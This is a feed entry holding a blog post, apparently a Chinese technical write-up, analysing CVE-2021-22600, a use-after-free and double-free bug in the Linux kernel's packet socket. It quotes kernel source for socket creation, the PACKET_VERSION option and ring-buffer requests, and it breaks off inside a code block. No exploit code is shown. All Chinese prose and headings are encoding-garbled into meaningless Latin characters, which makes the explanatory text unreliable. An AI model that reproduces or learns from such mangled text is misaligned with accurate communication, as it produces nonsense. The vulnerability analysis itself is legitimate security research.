    <updated>2025-07-28T15:54:19.672Z</updated>
    
    <content type="html"><![CDATA[<p>Packet Socket ç¬‘ä¼ ä¹‹åˆ›æ¬¡buffer</p><span id="more"></span><h1 id="0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰"><a href="#0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰" class="headerlink" title="0x00. ä¸€åˆ‡å¼€å§‹ä¹‹å‰"></a>0x00. ä¸€åˆ‡å¼€å§‹ä¹‹å‰</h1><p><a href="https://nvd.nist.gov/vuln/detail/cve-2021-22600">CVE-2021-22600</a> æ˜¯ä¸€ä¸ªå‘ç”Ÿåœ¨ Linux kernel çš„ç½‘ç»œå­ç³»ç»Ÿä¸­çš„ Packet Socket å½“ä¸­çš„ <strong>æ£€æŸ¥ç¼ºä¹å¯¼è‡´çš„ç±»å‹æ··æ·†ä¸é‡Šæ”¾åä½¿ç”¨</strong> æ¼æ´ï¼Œå¾—ç›Šäºåœ¨ Packet Socket å¯¹å®Œæˆ <code>setsocktop()</code> æ“ä½œä¸­çš„ <code>PACKET_VERSION</code> åˆ‡æ¢ socket ç‰ˆæœ¬åçš„çŠ¶æ€çš„æ£€æŸ¥ä¸ä¸¥æ ¼ï¼Œä»¥åŠå¯¹åŒä¸€å†…æ ¸å¯¹è±¡çš„åŒé‡è®°å½•ï¼Œæ”»å‡»è€…å¯ä»¥ä½¿å†…æ ¸å°†ä¸€ä¸ª <code>TPACKET_v3</code> æ‰€ç”¨çš„å¯¹è±¡åœ¨é‡Šæ”¾ä¹‹åä»èƒ½è¢«è¯¯ç”¨ä¸º  <code>TPACKET_v2</code> æ‰€ç”¨ç±»å‹ï¼Œä»è€Œé€šè¿‡è¯¥æ¼æ´ <strong>å®Œæˆå¯¹ç‰¹å®šå†…æ ¸å¯¹è±¡çš„åŒé‡é‡Šæ”¾</strong> ï¼Œæœ€ç»ˆæ”»å‡»å†…æ ¸ä»¥å®Œæˆæœ¬åœ°ææƒ</p><p>è¯¥æ¼æ´çš„ CVSS åˆ†æ•°ä¸º <code>7.8</code> ï¼Œå½±å“ç‰ˆæœ¬åŒ…æ‹¬ä½†ä¸é™äº <code>4.14.175~4.14.258</code> ã€<code>4.19.114~4.19.221</code>ã€<code>5.4.29~5.4.167</code>ã€<code>5.5.14~5.10.87</code>ã€<code>5.11~5.15.11</code>ï¼Œæœ¬æ–‡æˆ‘ä»¬é€‰ç”¨ <code>5.11.16</code> ç‰ˆæœ¬çš„å†…æ ¸æºç è¿›è¡Œåˆ†æ</p><h2 id="Packet-Socket"><a href="#Packet-Socket" class="headerlink" title="Packet Socket"></a>Packet Socket</h2><p><a href="https://man7.org/linux/man-pages/man7/packet.7.html">Packet Socket</a> æ˜¯ Linux å½“ä¸­çš„ä¸€ç§ç”¨äºåœ¨è®¾å¤‡é©±åŠ¨å±‚ï¼ˆOSI æ¨¡å‹è‡ªåº•å‘ä¸Šç¬¬ 2 å±‚ï¼‰æ¥æ”¶ raw packets çš„ socketsï¼Œä»è€Œä½¿å¾—å¼€å‘è€…å¯ä»¥é€šè¿‡ç”¨æˆ·æ€ç¨‹åºåœ¨ç‰©ç†å±‚ä¸Šå®ç°ä¸Šå±‚çš„åè®®è§£ææ¨¡å—ï¼ˆå½“ç„¶ï¼Œè¿™ä¹Ÿå°±éœ€è¦ç”¨æˆ·å¿…é¡»å…·å¤‡ <code>CAP_NET_RAW</code> æƒé™ï¼‰ï¼š</p><p><img src="https://s2.loli.net/2025/05/02/H5J9rqGK1g4BeZC.png"></p><p>åœ¨åˆ›å»º Packet Socket æ—¶ï¼Œæˆ‘ä»¬åº”å½“æŒ‡å®š <code>domain</code> ä¸º <code>AF_PACKET</code> ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">packet_socket = socket(AF_PACKET, <span class="hljs-type">int</span> socket_type, <span class="hljs-type">int</span> protocol);<br></code></pre></td></tr></table></figure><p>å¯¹äº socket typeï¼Œæˆ‘ä»¬æœ‰ä¸¤ç§å¯é€‰é¡¹ï¼š</p><ul><li><code>SOCK_RAW</code>ï¼šè¿™ä¸ºæˆ‘ä»¬æä¾›åŸå§‹çš„ raw packet</li><li><code>SOCK_DGRAM</code> ï¼šè¿™ä¸ºæˆ‘ä»¬æä¾›å»æ‰äº† Physical Header çš„ packet</li></ul><p>æ›´å¤šçš„ä½¿ç”¨æ–¹æ³•æˆ‘ä»¬å°±ä¸æ·±å…¥ä»‹ç»äº†ï¼Œè¿™é‡Œæˆ‘ä»¬æ¥çœ‹ Packet Socket çš„å†…æ ¸å®ç°ï¼Œé¦–å…ˆåœ¨æ¨¡å—åˆå§‹åŒ–å‡½æ•°ä¸­æ³¨å†Œäº† <code>PF_PACKET</code> è¿™ä¸€ familyï¼š</p><blockquote><p>&#x2F;net&#x2F;packet&#x2F;af_packet.c</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">net_proto_family</span> <span class="hljs-title">packet_family_ops</span> =</span> &#123;<br>.family =PF_PACKET,<br>.create =packet_create,<br>.owner=THIS_MODULE,<br>&#125;;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> __init <span class="hljs-title function_">packet_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br><span class="hljs-comment">//...</span><br>rc = sock_register(&amp;packet_family_ops);<br></code></pre></td></tr></table></figure><p>åœ¨åˆ›å»º Socket æ—¶æœ‰å¦‚ä¸‹è°ƒç”¨æ ˆï¼š</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">__x64_sys_socket</span>()</span><br><span class="hljs-function"><span class="hljs-title">__sys_socket</span>()</span><br><span class="hljs-function"><span class="hljs-title">sock_create</span>()</span><br><span class="hljs-function"><span class="hljs-title">__sock_create</span>()</span><br></code></pre></td></tr></table></figure><p>åœ¨ <code>__sock_create()</code> ä¸­ä¼šè°ƒç”¨åˆ° <code>net_proto_family::create()</code>ï¼š</p><blockquote><p>&#x2F;net&#x2F;socket.c</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __sock_create(<span class="hljs-keyword">struct</span> net *net, <span class="hljs-type">int</span> family, <span class="hljs-type">int</span> type, <span class="hljs-type">int</span> protocol,<br> <span class="hljs-keyword">struct</span> socket **res, <span class="hljs-type">int</span> kern)<br>&#123;<br><span class="hljs-type">int</span> err;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">socket</span> *<span class="hljs-title">sock</span>;</span><br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">net_proto_family</span> *<span class="hljs-title">pf</span>;</span><br><br><span class="hljs-comment">//...</span><br><br>rcu_read_lock();<br>pf = rcu_dereference(net_families[family]);<br><span class="hljs-comment">//...</span><br><br>err = pf-&gt;create(net, sock, protocol, kern);<br></code></pre></td></tr></table></figure><p>å› æ­¤ä¼šè°ƒç”¨åˆ° <code>packet_family_ops::create</code> ï¼Œå³ <code>packet_create</code>ï¼š</p><blockquote><p>&#x2F;net&#x2F;packet&#x2F;af_packet.c</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> *Create a packet of type SOCK_PACKET.</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">packet_create</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> net *net, <span class="hljs-keyword">struct</span> socket *sock, <span class="hljs-type">int</span> protocol,</span><br><span class="hljs-params"> <span class="hljs-type">int</span> kern)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sock</span> *<span class="hljs-title">sk</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">packet_sock</span> *<span class="hljs-title">po</span>;</span><br>__be16 proto = (__force __be16)protocol; <span class="hljs-comment">/* weird, but documented */</span><br><span class="hljs-type">int</span> err;<br><br><span class="hljs-keyword">if</span> (!ns_capable(net-&gt;user_ns, CAP_NET_RAW))<br><span class="hljs-keyword">return</span> -EPERM;<br><span class="hljs-keyword">if</span> (sock-&gt;type != SOCK_DGRAM &amp;&amp; sock-&gt;type != SOCK_RAW &amp;&amp;<br>    sock-&gt;type != SOCK_PACKET)<br><span class="hljs-keyword">return</span> -ESOCKTNOSUPPORT;<br><br>sock-&gt;state = SS_UNCONNECTED;<br><br>err = -ENOBUFS;<br>sk = sk_alloc(net, PF_PACKET, GFP_KERNEL, &amp;packet_proto, kern);<br><span class="hljs-keyword">if</span> (sk == <span class="hljs-literal">NULL</span>)<br><span class="hljs-keyword">goto</span> out;<br><br>sock-&gt;ops = &amp;packet_ops;<br><span class="hljs-keyword">if</span> (sock-&gt;type == SOCK_PACKET)<br>sock-&gt;ops = &amp;packet_ops_spkt;<br><br>sock_init_data(sock, sk);<br><br>po = pkt_sk(sk);<br>init_completion(&amp;po-&gt;skb_completion);<br>sk-&gt;sk_family = PF_PACKET;<br>po-&gt;num = proto;<br>po-&gt;xmit = dev_queue_xmit;<br><br>err = packet_alloc_pending(po);<br><span class="hljs-keyword">if</span> (err)<br><span class="hljs-keyword">goto</span> out2;<br><br>packet_cached_dev_reset(po);<br><br>sk-&gt;sk_destruct = packet_sock_destruct;<br>sk_refcnt_debug_inc(sk);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> *Attach a protocol block</span><br><span class="hljs-comment"> */</span><br><br>spin_lock_init(&amp;po-&gt;bind_lock);<br>mutex_init(&amp;po-&gt;pg_vec_lock);<br>po-&gt;rollover = <span class="hljs-literal">NULL</span>;<br>po-&gt;prot_hook.func = packet_rcv;<br><br><span class="hljs-keyword">if</span> (sock-&gt;type == SOCK_PACKET)<br>po-&gt;prot_hook.func = packet_rcv_spkt;<br><br>po-&gt;prot_hook.af_packet_priv = sk;<br><br><span class="hljs-keyword">if</span> (proto) &#123;<br>po-&gt;prot_hook.type = proto;<br>__register_prot_hook(sk);<br>&#125;<br><br>mutex_lock(&amp;net-&gt;packet.sklist_lock);<br>sk_add_node_tail_rcu(sk, &amp;net-&gt;packet.sklist);<br>mutex_unlock(&amp;net-&gt;packet.sklist_lock);<br><br>preempt_disable();<br>sock_prot_inuse_add(net, &amp;packet_proto, <span class="hljs-number">1</span>);<br>preempt_enable();<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>out2:<br>sk_free(sk);<br>out:<br><span class="hljs-keyword">return</span> err;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘ä»¬æ³¨æ„åˆ° packet socket çš„æ“ä½œå‡½æ•°è¡¨è¢«åˆå§‹åŒ–ä¸º <code>packet_ops</code> ï¼š</p><blockquote><p>&#x2F;net&#x2F;packet&#x2F;af_packet.c</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proto_ops</span> <span class="hljs-title">packet_ops</span> =</span> &#123;<br>.family =PF_PACKET,<br>.owner =THIS_MODULE,<br>.release =packet_release,<br>.bind =packet_bind,<br>.connect =sock_no_connect,<br>.socketpair =sock_no_socketpair,<br>.accept =sock_no_accept,<br>.getname =packet_getname,<br>.poll =packet_poll,<br>.ioctl =packet_ioctl,<br>.gettstamp =sock_gettstamp,<br>.listen =sock_no_listen,<br>.shutdown =sock_no_shutdown,<br>.setsockopt =packet_setsockopt,<br>.getsockopt =packet_getsockopt,<br>.sendmsg =packet_sendmsg,<br>.recvmsg =packet_recvmsg,<br>.mmap =packet_mmap,<br>.sendpage =sock_no_sendpage,<br>&#125;;<br><br></code></pre></td></tr></table></figure><h2 id="setsockopt-for-Packet-Socket"><a href="#setsockopt-for-Packet-Socket" class="headerlink" title="setsockopt for Packet Socket"></a>setsockopt for Packet Socket</h2><p>å’Œå…¶ä»–ç±»å‹çš„ socket ä¸€æ ·ï¼Œpacket socket ä¹Ÿä¸ºæˆ‘ä»¬æä¾›äº† setsockopt å‡½æ•°ä»¥è¿›è¡Œå„ç§é«˜çº§åŠŸèƒ½ï¼Œå…¶å†…éƒ¨å®ç°å’Œç»å¤§å¤šæ•° <code>setsockopt</code> ä¸€æ ·æ˜¯ä¸ªå·¨å¤§çš„ switchï¼š</p><blockquote><p>&#x2F;net&#x2F;packet&#x2F;af_packet.c</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span><br><span class="hljs-title function_">packet_setsockopt</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> socket *sock, <span class="hljs-type">int</span> level, <span class="hljs-type">int</span> optname, <span class="hljs-type">sockptr_t</span> optval,</span><br><span class="hljs-params">  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> optlen)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sock</span> *<span class="hljs-title">sk</span> =</span> sock-&gt;sk;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">packet_sock</span> *<span class="hljs-title">po</span> =</span> pkt_sk(sk);<br><span class="hljs-type">int</span> ret;<br><br><span class="hljs-keyword">if</span> (level != SOL_PACKET)<br><span class="hljs-keyword">return</span> -ENOPROTOOPT;<br><br><span class="hljs-keyword">switch</span> (optname) &#123;<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬è¿™é‡Œä¸»è¦å…³æ³¨ä¸æˆ‘ä»¬çš„æ¼æ´æœ‰å…³çš„å‡ ä¸ªå­åŠŸèƒ½</p><h3 id="PACKET-VERSIONï¼šç‰ˆæœ¬å˜æ›´"><a href="#PACKET-VERSIONï¼šç‰ˆæœ¬å˜æ›´" class="headerlink" title="PACKET_VERSIONï¼šç‰ˆæœ¬å˜æ›´"></a>PACKET_VERSIONï¼šç‰ˆæœ¬å˜æ›´</h3><p>Packet Socket å­˜åœ¨ä¸‰ä¸ªä¸åŒçš„ç‰ˆæœ¬ï¼š<code>V1ã€V2ã€V3</code> ï¼Œè€Œ <code>setsockopt</code> çš„ <code>PACKET_VERSION</code> å­åŠŸèƒ½è®©æˆ‘ä»¬å¯ä»¥å®æ—¶å˜æ›´ Packet Socket çš„ç‰ˆæœ¬ï¼š</p><blockquote><p>&#x2F;net&#x2F;packet&#x2F;af_packet.c</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">case</span> PACKET_VERSION:<br>&#123;<br><span class="hljs-type">int</span> val;<br><br><span class="hljs-keyword">if</span> (optlen != <span class="hljs-keyword">sizeof</span>(val))<br><span class="hljs-keyword">return</span> -EINVAL;<br><span class="hljs-keyword">if</span> (copy_from_sockptr(&amp;val, optval, <span class="hljs-keyword">sizeof</span>(val)))<br><span class="hljs-keyword">return</span> -EFAULT;<br><span class="hljs-keyword">switch</span> (val) &#123;<br><span class="hljs-keyword">case</span> TPACKET_V1:<br><span class="hljs-keyword">case</span> TPACKET_V2:<br><span class="hljs-keyword">case</span> TPACKET_V3:<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">default</span>:<br><span class="hljs-keyword">return</span> -EINVAL;<br>&#125;<br>lock_sock(sk);<br><span class="hljs-keyword">if</span> (po-&gt;rx_ring.pg_vec || po-&gt;tx_ring.pg_vec) &#123;<br>ret = -EBUSY;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>po-&gt;tp_version = val;<br>ret = <span class="hljs-number">0</span>;<br>&#125;<br>release_sock(sk);<br><span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="PACKET-RX-RING-PACKET-TX-RINGï¼šåˆ›å»ºç¯å½¢ç¼“å†²åŒº"><a href="#PACKET-RX-RING-PACKET-TX-RINGï¼šåˆ›å»ºç¯å½¢ç¼“å†²åŒº" class="headerlink" title="PACKET_RX_RING || PACKET_TX_RINGï¼šåˆ›å»ºç¯å½¢ç¼“å†²åŒº"></a>PACKET_RX_RING || PACKET_TX_RINGï¼šåˆ›å»ºç¯å½¢ç¼“å†²åŒº</h3><p>è¿™ä¸¤ä¸ªå­åŠŸèƒ½ä¸»è¦ç”¨äºä¸ºæ•°æ®åŒ…çš„æ”¶å‘åˆ›å»ºé«˜é€Ÿçš„ç¯å½¢ç¼“å†²åŒºï¼Œ <strong>ç”¨æˆ·å¯ä»¥å°†å†…æ ¸ä¸­çš„ç¯å½¢ç¼“å†²åŒºæ˜ å°„åˆ°ç”¨æˆ·åœ°å€ç©ºé—´ï¼Œä»è€Œå®ç°å¿«é€Ÿçš„æ•°æ®åŒ…æ”¶å‘åŠŸèƒ½</strong> ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬å¸¸è¯´çš„ <code>zero copy</code> ï¼Œè¿™å‡å°‘äº†ç³»ç»Ÿè°ƒç”¨çš„çŠ¶æ€åˆ‡æ¢ä¸æ•°æ®æ‹·è´å¼€é”€ï¼š</p><ul><li>å¯¹äºå‘é€ï¼ˆ <code>TX</code> ï¼‰è€Œè¨€ï¼Œåº”ç”¨ç¨‹åºç›´æ¥å°†æ•°æ®åŒ…å†™å…¥æ˜ å°„åˆ°ç”¨æˆ·ç©ºé—´çš„ç¼“å†²åŒºï¼Œä¹‹åå†…æ ¸ä¾¿èƒ½ç›´æ¥è¯»å–ç¼“å†²åŒºä¸­çš„å¾…å‘é€æ•°æ®åŒ…</li><li>å¯¹äºæ¥å—ï¼ˆ<code>RX</code>ï¼‰è€Œè¨€ï¼Œå†…æ ¸ç›´æ¥å°†æ•°æ®åŒ…å†™å…¥æ˜ å°„åˆ°ç”¨æˆ·ç©ºé—´çš„ç¼“å†²åŒºï¼Œä¹‹ååœ¨ç”¨æˆ·ç©ºé—´ä¾¿èƒ½ç›´æ¥è¯»å–ç¼“å†²åŒºä¸­çš„å·²æ¥æ”¶æ•°æ®åŒ…</li></ul><blockquote><p>&#x2F;net&#x2F;packet&#x2F;af_packet.c</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">case</span> PACKET_RX_RING:<br><span class="hljs-keyword">case</span> PACKET_TX_RING:<br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">tpacket_req_u</span> <span class="hljs-title">req_u</span>;</span><br><span class="hljs-type">int</span> len;<br><br>lock_sock(sk);<br><span class="hljs-keyword">switch</span> (po-&gt;tp_version) &#123;<br><span class="hljs-keyword">case</span> TPACKET_V1:<br><span class="hljs-keyword">case</span> TPACKET_V2:<br>len = <span class="hljs-keyword">sizeof</span>(req_u.req);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> TPACKET_V3:<br><span class="hljs-keyword">default</span>:<br>len = <span class="hljs-keyword">sizeof</span>(req_u.req3);<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">if</span> (optlen &lt; len) &#123;<br>ret = -EINVAL;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">if</span> (copy_from_sockptr(&amp;req_u.req, optval, len))<br>ret = -EFAULT;<br><span class="hljs-keyword">else</span><br>ret = packet_set_ring(sk, &amp;req_u, <span class="hljs-number">0</span>,<br>    optname == PACKET_TX_RING);<br>&#125;<br>release_sock(sk);<br><span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç¯å½¢ç¼“å†²åŒºçš„æ ¸å¿ƒç»“æ„æ˜¯ <code>pgv</code> ç»“æ„ä½“ï¼Œæœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªæŒ‡é’ˆï¼Œåœ¨å®é™…ä½¿ç”¨æ—¶ä¼šè¢«åˆ›å»ºä¸º <strong>æŒ‡é’ˆæ•°ç»„</strong> ï¼š</p><blockquote><p>&#x2F;net&#x2F;packet&#x2F;internal.h</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pgv</span> &#123;</span><br><span class="hljs-type">char</span> *buffer;<br>&#125;;<br></code></pre></td></tr></table></figure><p>åœ¨çœ‹ç¯å½¢ç¼“å†²åŒºä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆæ¥çœ‹ç”¨æˆ·åº”å½“æäº¤çš„è¯·æ±‚çš„æ ¼å¼ï¼Œç‰ˆæœ¬ V1ã€V2 å’Œ V3 ä½¿ç”¨çš„æ˜¯ä¸åŒçš„æ ¼å¼ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tpacket_req</span> &#123;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>tp_block_size;<span class="hljs-comment">/* æœ€å°è¿ç»­å—çš„å¤§å° */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>tp_block_nr;<span class="hljs-comment">/* å—çš„æ•°é‡ */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>tp_frame_size;<span class="hljs-comment">/* å¸§çš„å¤§å° */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>tp_frame_nr;<span class="hljs-comment">/* å¸§çš„æ•°é‡ */</span><br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tpacket_req3</span> &#123;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>tp_block_size;<span class="hljs-comment">/* æœ€å°è¿ç»­å—çš„å¤§å° */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>tp_block_nr;<span class="hljs-comment">/* å—çš„æ•°é‡ */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>tp_frame_size;<span class="hljs-comment">/* å¸§çš„å¤§å° */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>tp_frame_nr;<span class="hljs-comment">/* å¸§çš„æ•°é‡ */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>tp_retire_blk_tov; <span class="hljs-comment">/* timeout in msecs */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>tp_sizeof_priv; <span class="hljs-comment">/* offset to private data area */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>tp_feature_req_word;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">tpacket_req_u</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tpacket_req</span><span class="hljs-title">req</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tpacket_req3</span><span class="hljs-title">req3</span>;</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>ä¸‹é¢æ˜¯ç¬”è€…ä»¥ V1 ä¸ºä¾‹å†™çš„ä¸€ä¸ªç®€å•çš„ <em>ç”¨æˆ·æ€è¯·æ±‚ç¯å½¢ç¼“å†²åŒº</em> çš„ä¾‹å­ï¼Œç¯å½¢ç¼“å†²åŒºçš„æ€»å¤§å°ä¸º <strong>tp_block_size * tp_block_nr</strong> ï¼Œå—å¤§å° <code>tp_block_size</code> ä¾¿æ˜¯ <code>pgv</code> ç»“æ„ä½“æ•°ç»„ä¸­å•ä¸ª entry çš„å¤§å°ï¼Œå—æ•°é‡è‡ªç„¶æ˜¯ <code>pgv</code> æ•°ç»„æˆå‘˜æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span 